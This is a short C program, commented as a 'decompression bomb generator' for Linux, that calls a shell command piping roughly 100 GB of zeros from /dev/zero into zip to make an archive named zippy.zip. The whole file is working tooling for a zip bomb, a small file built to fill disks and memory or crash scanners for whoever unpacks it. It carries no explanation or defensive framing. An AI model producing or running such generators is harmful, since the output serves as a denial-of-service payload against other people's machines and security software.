//one-line decompression bomb generator for LiGNUx
#include <stdio.h>
#include <stdlib.h>
int main(){
  system("clear");
  system("dd if=/dev/zero bs=1024 count=100000000 | zip zippy.zip -");
  return(0);
}
